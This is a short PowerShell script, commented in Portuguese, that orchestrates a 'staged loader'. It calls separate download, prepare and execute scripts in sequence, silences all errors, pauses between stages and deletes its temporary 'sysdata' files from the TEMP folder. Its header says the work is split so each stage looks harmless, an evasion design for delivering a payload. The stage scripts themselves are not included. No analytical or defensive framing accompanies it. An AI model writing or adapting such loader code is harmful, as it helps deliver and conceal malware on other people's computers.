# =============================================================================
# LOADER STAGED - ORQUESTRADOR
# =============================================================================
# Este script executa as 3 etapas em sequencia
# Cada etapa e independente e parece inofensiva
# =============================================================================

$ErrorActionPreference = "SilentlyContinue"

# Stage 1: Download
$stage1 = & "$PSScriptRoot\stage1_download.ps1"
if (-not $stage1) {
    exit 1
}

Start-Sleep -Milliseconds 500

# Stage 2: Prepare
$stage2 = & "$PSScriptRoot\stage2_prepare.ps1" -inputPath $stage1
if (-not $stage2) {
    exit 1
}

Start-Sleep -Milliseconds 500

# Stage 3: Execute
& "$PSScriptRoot\stage3_execute.ps1" -dataPath $stage2

# Cleanup (opcional)
Start-Sleep -Seconds 2
Remove-Item "$env:TEMP\sysdata.*" -Force -ErrorAction SilentlyContinue
